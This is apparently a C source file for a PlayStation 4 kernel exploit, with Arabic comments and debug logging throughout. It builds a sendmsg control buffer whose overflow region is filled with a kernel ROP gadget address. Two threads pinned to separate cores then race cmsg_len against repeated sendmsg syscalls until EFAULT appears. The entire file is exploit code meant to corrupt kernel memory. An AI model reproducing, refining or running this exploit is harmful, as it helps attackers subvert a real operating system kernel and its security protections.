#include <ps4.h>

// --- تعريف الهياكل المفقودة ---
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };
struct msghdr {
    void *msg_name; uint32_t msg_namelen; struct iovec *msg_iov;
    int msg_iovlen; void *msg_control; uint32_t msg_controllen; int msg_flags;
};

typedef struct { uint64_t bits[16]; } cpuset_t;
#define CPU_SET(n, p) ((p)->bits[(n)/64] |= (1ULL << ((n)%64)))
#define CPU_ZERO(p) memset((p), 0, sizeof(cpuset_t))

// الوظيفة المستوردة لربط الأنوية
int (*pthread_setaffinity_np)(ScePthread thread, size_t cpusetsize, const cpuset_t *cpuset);

#define PS4_PAGE_SIZE 0x4000
#define OVERFLOW_SIZE 256 
#define NCMSG         14
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

uint8_t *BaseArea;
struct cmsghdr *ControlBuf;
size_t ControlBufLen;
volatile int stop_race = 0;
uint64_t n_tries = 0;
uint64_t n_efaults = 0;

// --- 1. بناء البفر مع Debugging للحسابات ---
void BuildPrecisionBuffer(uint64_t kbase) {
    printf_debug("[DEBUG] Entering BuildPrecisionBuffer...\n");
    
    size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
    size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);
    
    printf_debug("[DEBUG] Calculated allocsz: 0x%zx, cmsgsize: 0x%zx\n", allocsz, cmsgsize);

    // حجز الذاكرة
    BaseArea = (uint8_t *)mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ|PROT_WRITE, 0x0002 | 0x1000, -1, 0);
    if (BaseArea == (uint8_t *)-1) {
        printf_debug("[ERROR] mmap failed! errno: %d\n", errno);
        return;
    }
    printf_debug("[DEBUG] BaseArea mapped at: %p\n", BaseArea);

    // حماية الصفحة الثانية
    if (mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE) != 0) {
        printf_debug("[ERROR] mprotect failed! errno: %d\n", errno);
    } else {
        printf_debug("[DEBUG] Guard page set at: %p\n", BaseArea + allocsz);
    }

    // محاذاة البفر
    uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
    ControlBuf = (struct cmsghdr *)aligned_base;
    ControlBufLen = cmsgsize;
    printf_debug("[DEBUG] ControlBuf aligned at: %p\n", ControlBuf);

    // ملء البيانات
    for (int i = 0; i < NCMSG; i++) {
        ControlBuf[i].cmsg_len = sizeof(struct cmsghdr);
        ControlBuf[i].cmsg_type = 7;
    }

    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;
    for (int i = 0; i < OVERFLOW_SIZE; i += 8) {
        *(uintptr_t *)(overflow_ptr + i) = trigger;
    }
    printf_debug("[DEBUG] Payload armed with trigger: 0x%llx\n", trigger);
}

// --- 2. خيط التخريب (Wrecker) ---
void *wrecker_thread(void *arg) {
    (void)arg;
    printf_debug("[DEBUG] Wrecker thread started on Core 1\n");
    
    while (!stop_race) {
        ControlBuf[NCMSG-1].cmsg_len = sizeof(struct cmsghdr);
        for(volatile int i=0; i<150; i++); // تأخير المزامنة
        
        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF; // الهجوم
        for(volatile int i=0; i<150; i++);
    }
    
    printf_debug("[DEBUG] Wrecker thread exiting...\n");
    return NULL;
}

// --- 3. خيط التنفيذ (Executor) ---
void *executor_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = ControlBuf;
    msg.msg_controllen = (uint32_t)ControlBufLen;
    const int bad_fd = 666;

    printf_debug("[DEBUG] Executor thread started on Core 2\n");

    while (!stop_race) {
        n_tries++;
        
        // محاولة الاستغلال
        syscall(28, bad_fd, &msg, 0); 
        
        // فحص حالة الخطأ
        int err = errno;
        if (err == 14) { // EFAULT
            n_efaults++;
            stop_race = 1;
            printf_debug("[!!!] SUCCESS: EFAULT detected at try #%llu\n", n_tries);
            break;
        } 
        
        // Log كل 50 ألف محاولة للتأكد أن النظام لم يتجمد
        if (n_tries % 50000 == 0) {
            printf_debug("[INFO] Still racing... Tries: %llu, Last errno: %d\n", n_tries, err);
        }
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel(); initLibc(); initSysUtil();
    
    printf_debug("\n--- PS4 KERNEL RACE DEBUG MODE ---\n");

    // جلب الوظائف الحيوية
    int libKernelHandle = sceKernelLoadStartModule("/system/common/lib/libkernel.sprx", 0, NULL, 0, NULL, NULL);
    if (libKernelHandle <= 0) {
        printf_debug("[ERROR] Could not load libkernel\n");
        return -1;
    }
    RESOLVE(libKernelHandle, pthread_setaffinity_np);
    printf_debug("[DEBUG] pthread_setaffinity_np resolved\n");

    uint64_t kbase = get_kernel_base();
    printf_debug("[DEBUG] Kernel Base: 0x%llx\n", kbase);

    BuildPrecisionBuffer(kbase);

    // إعداد الأنوية
    cpuset_t cpuset1, cpuset2;
    CPU_ZERO(&cpuset1); CPU_SET(1, &cpuset1);
    CPU_ZERO(&cpuset2); CPU_SET(2, &cpuset2);

    ScePthread wrid, exid;
    
    printf_debug("[DEBUG] Launching threads...\n");
    
    scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
    pthread_setaffinity_np(wrid, sizeof(cpuset_t), &cpuset1);

    scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");
    pthread_setaffinity_np(exid, sizeof(cpuset_t), &cpuset2);

    // الانتظار
    scePthreadJoin(exid, NULL);
    stop_race = 1;
    scePthreadJoin(wrid, NULL);

    printf_debug("[DEBUG] Race finished. Total tries: %llu\n", n_tries);
    printf_debug("--- END OF DEBUG ---\n");

    return 0;
}
